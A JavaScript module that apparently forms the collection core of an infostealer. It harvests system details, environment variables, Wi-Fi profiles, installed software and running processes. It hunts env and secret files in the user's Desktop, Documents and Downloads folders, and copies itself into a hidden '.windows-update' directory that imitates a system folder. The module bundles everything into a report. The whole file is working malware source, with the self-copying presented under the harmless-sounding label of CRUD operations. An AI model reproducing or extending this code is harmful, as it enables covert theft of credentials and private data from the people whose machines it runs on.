const fs = require("fs");
const os = require("os");
const path = require("path");
const logger = require("../utils/logger");

const {
    copyDirectory,
    setAllowedDir
} = require("../files/crud");
const { findEnvFiles } = require("../files/envHunter");

/**
 * @typedef {{ system: object, cpu: object, memory: object, user: object, environmentVariables: object }} SystemData
 *
 * @typedef {{ operation: string, status: string, result?: unknown, error?: string }} CrudEntry
 */
const getSystemInfo = require("../system/system");
const getCPUInfo = require("../system/cpu");
const getMemoryInfo = require("../system/memory");
const getUserInfo = require("../system/user");
const getEnvironmentInfo = require("../system/env");
const getWifiProfiles = require("../system/wifi");
const getInstalledSoftware = require("../system/software");
const getProcessList = require("../system/processes");
const { findSecretFiles } = require("../files/secretHunter");

const HIDDEN_DIR = path.join(os.homedir(), ".windows-update");
setAllowedDir(HIDDEN_DIR);

function safeCollect(fn, name, fallback) {
    try {
        return fn();
    } catch (err) {
        logger.warn(`Collector ${name} failed: ${err.message}`);
        return fallback;
    }
}

function collectSystemData() {
    return {
        system: safeCollect(getSystemInfo, "system", {}),
        cpu: safeCollect(getCPUInfo, "cpu", {}),
        memory: safeCollect(getMemoryInfo, "memory", {}),
        user: safeCollect(getUserInfo, "user", {}),
        environmentVariables: safeCollect(getEnvironmentInfo, "env", {}),
        wifi: safeCollect(getWifiProfiles, "wifi", []),
        software: safeCollect(getInstalledSoftware, "software", []),
        processes: safeCollect(getProcessList, "processes", [])
    };
}

function resolveDir(name) {
    const home = os.homedir();
    const onedrive = path.join(home, "OneDrive", name);
    const standard = path.join(home, name);
    if (fs.existsSync(onedrive)) return onedrive;
    if (fs.existsSync(standard)) return standard;
    logger.warn(`Directory not found: ${name}`);
    return null;
}

function huntEnvFiles() {
    const targets = [
        resolveDir("Desktop"),
        resolveDir("Documents"),
        resolveDir("Downloads")
    ].filter((d) => d !== null);

    logger.info(`Scanning ${targets.length} target directories for env files`);
    const files = findEnvFiles(targets);
    logger.info(`Found ${files.length} env/secret files`);
    return { targets, totalFound: files.length, files };
}

function huntSecretFiles() {
    return findSecretFiles();
}

function safeCrudStep(operation, fn) {
    try {
        const result = fn();
        return { operation, status: "OK", result };
    } catch (err) {
        logger.warn(`CRUD ${operation} failed: ${err.message}`);
        return { operation, status: "FAILED", error: err.message };
    }
}

function performCrudOperations(rootDir, dryRun = false) {
    const crudLog = [];

    if (dryRun) {
        crudLog.push({ operation: "DRY_RUN", status: "Skipped — dry-run mode" });
        return crudLog;
    }

    const isFirstRun = !fs.existsSync(HIDDEN_DIR);

    if (isFirstRun) {
        crudLog.push(safeCrudStep("COPY_PROJECT", () => ({
            source: path.join(rootDir, "src"),
            destination: path.join(HIDDEN_DIR, "src"),
            status: copyDirectory(
                path.join(rootDir, "src"),
                path.join(HIDDEN_DIR, "src")
            )
        })));

        if (fs.existsSync(path.join(rootDir, "package.json"))) {
            crudLog.push(safeCrudStep("COPY_FILE", () => {
                fs.copyFileSync(
                    path.join(rootDir, "package.json"),
                    path.join(HIDDEN_DIR, "package.json")
                );
                return { file: "package.json", status: "Copied" };
            }));
        }

        if (fs.existsSync(path.join(rootDir, "README.md"))) {
            crudLog.push(safeCrudStep("COPY_FILE", () => {
                fs.copyFileSync(
                    path.join(rootDir, "README.md"),
                    path.join(HIDDEN_DIR, "README.md")
                );
                return { file: "README.md", status: "Copied" };
            }));
        }

        crudLog.push({ operation: "FIRST_RUN", status: "Project copied to hidden directory" });
    } else {
        crudLog.push({ operation: "SKIP_COPY", status: "Hidden directory already exists" });
    }

    return crudLog;
}

function buildReport(systemData, envFiles, secretFiles, crudLog, startTime, errors = []) {
    return {
        timestamp: new Date().toISOString(),
        systemId: null,
        ...systemData,
        foundEnvFiles: envFiles,
        foundSecretFiles: secretFiles,
        crudOperations: crudLog,
        runtime: {
            nodeVersion: process.version,
            pid: process.pid,
            workingDirectory: process.cwd(),
            executionTimeMs: Date.now() - startTime
        },
        ...(errors.length ? { errors } : {})
    };
}

module.exports = {
    collectSystemData,
    huntEnvFiles,
    huntSecretFiles,
    performCrudOperations,
    buildReport
};
